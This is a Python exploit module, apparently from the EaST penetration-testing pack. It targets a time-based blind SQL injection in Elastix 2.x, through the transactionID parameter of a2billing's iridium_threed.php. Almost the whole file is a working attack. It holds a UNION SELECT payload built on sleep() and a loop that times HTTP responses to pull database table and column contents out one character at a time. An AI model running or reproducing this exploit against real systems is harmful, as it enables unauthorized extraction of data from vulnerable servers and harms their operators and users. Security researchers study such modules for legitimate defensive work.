#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urllib
import urlparse
import ssl
from string import printable
import time
from core.WebHelper import FormPoster
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "elastix_2_x_bsqli"
INFO['DESCRIPTION'] = "Elastix 2.x Blind SQLi"
INFO['VENDOR'] = "http://www.elastix.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    The GET parameter transactionID was used directly in the SQL query without any sanitization which lead directly to SQL Injection vulnerability...
Tested against Elastix 2.4 on CentOS 5.9.
v2.5.0 and prior versions should be affected too.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = ['https://www.exploit-db.com/exploits/36305/']
INFO['CHANGELOG'] = "7 Mar, 2015. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.243"
OPTIONS["SSL"] = True
OPTIONS["TABLE"] = "INFORMATION_SCHEMA.SCHEMATA"
OPTIONS["COLUMN"] = "schema_name"
OPTIONS["TTL"] = 6
OPTIONS["SHOW EVERY FOUND SYMBOL"] = True



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.table = self.args.get('TABLE', OPTIONS['TABLE'])
        self.column = self.args.get('COLUMN', OPTIONS['COLUMN'])
        self.ttl = self.args.get('TTL', OPTIONS['TTL'])
        self.debug = self.args.get('SHOW EVERY FOUND SYMBOL', OPTIONS['SHOW EVERY FOUND SYMBOL'])
        proto = "https" if self.ssl else "http"
        self.url = "{}://{}".format(proto, self.host) + "/a2billing/customer/iridium_threed.php?transactionID="
        self.vuln_data = '-1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,if(ascii(mid(IFNULL(CAST({column} AS CHAR),0x20),{char_pos},1))={char_ord},sleep({ttl}),0) from {table} LIMIT {entry_no},1'
        self.log(self.url)

    def find(self, table, column):
        result = []
        subresult = []
        entry_no = 0
        char_pos = 1
        tryes = 10
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        while 1:
            changed = False
            for char in printable:
                char_ord = ord(char)
                begin = time.time()
                data = urllib.quote(self.vuln_data.format(table=table, column=column, entry_no=entry_no, char_pos=char_pos, char_ord=char_ord, ttl=self.ttl), safe='')
                res = urllib.urlopen(self.url + data, context=gcontext).read()
                end = time.time() - begin
                if end > self.ttl:
                    changed = True
                    if self.debug:
                        self.log(char)
                    subresult.append(char)
                    break
            if changed:
                char_pos += 1
            else:
                if char_pos == 1:
                    tryes -= 1
                    if tryes < 0:
                        break
                else:
                    res = "".join(subresult)
                    result.append(res)
                    self.log("[+] Found: %s" % (res))
                subresult = []
                char_pos = 1
                entry_no += 1
        return result


    def run(self):
        self.args()
        self.log("[*] Trying to get `%s` from `%s`..." % (self.column, self.table))
        result = self.find(self.table, self.column)
        self.log("[+] Found following entries:")
        self.log(result)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()